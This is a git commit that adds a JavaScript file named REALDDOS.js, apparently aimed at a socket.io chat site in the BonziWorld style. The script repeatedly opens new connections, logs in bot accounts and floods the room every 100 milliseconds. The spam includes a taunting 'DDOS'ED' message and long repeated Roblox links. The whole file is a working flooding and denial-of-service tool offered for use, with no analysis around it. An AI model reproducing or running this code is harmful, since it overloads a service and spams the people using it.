ecfac1d8b5aa6ca0b670ff8fa5ce0a9ed3589664
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-05-23 14:43:23 -0300

    Create REALDDOS.js

---
+++ Super Flooding/REALDDOS.js
@@ -0,0 +1,53 @@
+setInterval(() => {
+    const socketb = io("//");
+    socketb.emit("client", "MAIN");
+    socketb.emit("login", {
+        name: "BWJS DDoS Bot",
+    });
+    socketb.emit("command", {
+        list: ["color"]
+    });
+    socketb.emit("command", {
+        list: ["color"]
+    });
+    setInterval(() => {
+    socketb.emit("talk", {
+        text: "THIS SITE HAS BEEN DDOS'ED BY BONZIWORLD ULTIMATE JAVASCRIPT! GET OFF YOUR KIDDIE SERVER NOW! https://github.com/tlrenny25/BONZIWORLDULTIMATEJAVASCRIPT"
+    });
+    socket.emit("talk", {
+        text: "THIS SITE HAS BEEN DDOS'ED BY BONZIWORLD ULTIMATE JAVASCRIPT! GET OFF YOUR KIDDIE SERVER NOW! https://github.com/tlrenny25/BONZIWORLDULTIMATEJAVASCRIPT"
+    });
+    }, 100)
+}, 1000)
+
+function runLater() {
+  setInterval(() => {
+    const socket = io("//");
+    const sockett = io("//");
+    sockett.emit("client", "MAIN");
+    socket.emit("client", "MAIN");
+    socket.emit("login", {
+        name: "https://www.roblox.com/games/90615328924675/Maze",
+        room: Math.floor(Math.random() * 100)
+    });
+    socket.emit("login", {
+        name: "https://www.roblox.com/games/90615328924675/Maze"
+    });
+  setInterval(() => {
+      socket.emit("command", {
+          list: ["color"]
+      });
+      socket.emit("talk", {
+          text: "https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze " + Math.random() * 100000000000000000000
+      });
+      sockett.emit("command", {
+          list: ["color"]
+      });
+      sockett.emit("talk", {
+          text: "https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze " + Math.random() * 100000000000000000000
+      });
+  }, 100)
+}, 1000)
+}
+
+setTimeout(runLater, 10000);
